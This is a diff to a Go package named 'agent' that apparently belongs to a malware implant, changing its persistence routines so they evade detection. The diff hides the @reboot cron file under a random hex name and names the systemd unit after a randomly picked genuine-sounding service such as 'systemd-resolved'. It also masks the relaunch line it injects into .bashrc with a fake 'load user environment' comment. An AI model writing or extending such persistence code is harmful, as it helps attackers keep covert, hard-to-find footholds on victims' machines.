@@ -1,12 +1,31 @@
 package agent
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/user"
 	"path/filepath"
 	"runtime"
 )
+
+var serviceNames = []string{
+	"dbus-session", "journal-flush", "logrotate-daily",
+	"systemd-resolved", "networkd-wait", "upower-daemon",
+}
+
+func randomHexName() string {
+	b := make([]byte, 4)
+	rand.Read(b)
+	return hex.EncodeToString(b)
+}
+
+func pickServiceName() string {
+	b := make([]byte, 1)
+	rand.Read(b)
+	return serviceNames[int(b[0])%len(serviceNames)]
+}
 
 func executablePath() (string, error) {
 	p, err := os.Executable()
@@ -38,7 +57,7 @@ func PersistCron() error {
 		os.MkdirAll(cronDir, 0700)
 	}
 
-	cronPath := filepath.Join(cronDir, ".shard")
+	cronPath := filepath.Join(cronDir, "."+randomHexName())
 	var entry string
 	if os.Getuid() == 0 {
 		entry = fmt.Sprintf("@reboot root %s --daemon\n", execPath)
@@ -71,8 +90,9 @@ func PersistSystemd() error {
 		os.MkdirAll(unitDir, 0700)
 	}
 
+	svcName := pickServiceName()
 	unit := fmt.Sprintf(`[Unit]
-Description=System Monitor Service
+Description=System Helper Service
 After=network.target
 
 [Service]
@@ -85,7 +105,7 @@ RestartSec=30
 WantedBy=multi-user.target
 `, execPath)
 
-	unitPath := filepath.Join(unitDir, "sysmon.service")
+	unitPath := filepath.Join(unitDir, svcName+".service")
 	return os.WriteFile(unitPath, []byte(unit), 0600)
 }
 
@@ -105,7 +125,7 @@ func PersistBashRC() error {
 	}
 
 	rcPath := filepath.Join(u.HomeDir, ".bashrc")
-	line := fmt.Sprintf("\n(nohup %s --daemon >/dev/null 2>&1 &)\n", execPath)
+	line := fmt.Sprintf("\n# load user environment\n[ -x %s ] && (%s --daemon >/dev/null 2>&1 &)\n", execPath, execPath)
 
 	existing, _ := os.ReadFile(rcPath)
 	if len(existing) > 0 {
